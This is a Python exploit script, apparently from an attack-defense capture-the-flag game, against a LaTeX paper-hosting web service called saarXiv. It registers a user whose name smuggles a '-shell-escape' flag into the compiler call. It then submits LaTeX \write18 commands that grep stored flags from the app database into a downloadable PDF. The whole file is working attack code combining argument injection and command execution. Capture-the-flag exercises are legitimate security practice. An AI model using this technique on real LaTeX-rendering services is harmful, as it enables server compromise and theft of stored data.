# coding: utf-8

import sys
import base64
import tempfile
import subprocess
import textwrap
import re
import html
import string
import random
import logging

import requests

TIMEOUT = 5

# 0=username
# 1==our paper_id
EXPLOIT_TEMPLATE = '''
\\immediate\\write18{{echo "FLAGS:" >> "./data/{0} -shell-escape/saarXiv_{1:05}.pdf"}}
\\immediate\\write18{{grep -aoe 'SAAR{{[A-Za-z0-9_-]*}}' app.db|tail -n 64 >> "./data/{0} -shell-escape/saarXiv_{1:05}.pdf"}}
'''

def random_string(n):
    return ''.join(random.choice(string.ascii_letters) for _ in range(n))

def register_account(url, username, firstname, lastname, password):
    s = requests.Session()
    s.verify=False
    r1 = s.get(url+'/Account/Register', timeout=TIMEOUT)
    req_token = re.findall(r'__RequestVerificationToken.*?value="(.*?)" />', r1.text, re.S)[0]
    r2 = s.post(url+'/Account/Register', data={'Input.Username': username, 'Input.Firstname': firstname, 'Input.Lastname': lastname, 'Input.Password': password, 'Input.ConfirmPassword': password, '__RequestVerificationToken': req_token}, timeout=TIMEOUT)
    return s

def create_paper(s, url, title, content):
    r1 = s.get(url+'/Paper/Create', timeout=TIMEOUT)
    req_token = re.findall(r'__RequestVerificationToken.*?value="(.*?)" />', r1.text, re.S)[0]
    r2 = s.post(url+'/Paper/Create', data={'Input.Title': title, 'Input.Content': content, 'Input.UnderSubmission': True, '__RequestVerificationToken': req_token}, timeout=TIMEOUT)
    return int(re.findall(r'Successfully created paper (.*?)</div>', r2.text, re.S)[0])

def download_paper(s, url, paper_id):
    r1 = s.get(url+'/Paper/Download', params={'id': paper_id}, timeout=TIMEOUT)
    if 'Login' in r1.url or 'AccessDenied' in r1.url or int(r1.headers.get('Content-Length','')) == 0 or not r1.headers.get('Content-Type','').startswith('application/octet-stream'):
        raise ValueError(r1.headers)
    return r1

def leak_flags(s, username, url, hack_paper_id):
    r1 = s.get(url+'/Paper/Edit', params={'id': hack_paper_id})
    req_token = re.findall(r'__RequestVerificationToken.*?value="(.*?)" />', r1.text, re.S)[0]
    content = EXPLOIT_TEMPLATE.format(username, hack_paper_id)
    r2 = s.post(url+'/Paper/Edit', params={'id': hack_paper_id}, data={'Input.Title': 'Totally benign paper', 'Input.Content': content, 'Input.UnderSubmission': True, '__RequestVerificationToken': req_token})
    
    r3 = download_paper(s, url, hack_paper_id)    

    return r3.content.decode('utf-8')


def exploit(target, local=False):
    url = 'http://{}:5000'.format(target)

    s = requests.Session()

    # get newest paper_id
    r = s.get(url+'/All')
    paper_ids = re.findall(r'saarXiv_([0-9]+)', r.text, re.S)

    # create sentinel account (needed to create directories)
    acc_name = random_string(8)
    pw = random_string(8)
    s = register_account(url, acc_name, 'Foo', 'Bar', pw)
    tmp_paper_id = create_paper(s, url, 'Benign', 'Benign Paper')
    try:
        download_paper(s, url, tmp_paper_id)
    except ValueError:
        # allow failure here, we just want the directory to be created
        pass

    # create H4CK3R account
    hacc_name = acc_name+' -shell-escape'
    s = register_account(url, hacc_name, 'Foo', 'Bar', pw)
    hacc_paper_id = create_paper(s, url, 'H4ck', 'P4P3R')

    logging.debug('username: %s pw: %s', hacc_name, pw)

    # leak top 64
    try:
        print(leak_flags(s, acc_name, url, hacc_paper_id))
    except:
        logging.exception('Exception while leaking papers')


if __name__ == '__main__':

    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) > 1:
        exploit(sys.argv[1])
    else:
        exploit('localhost')
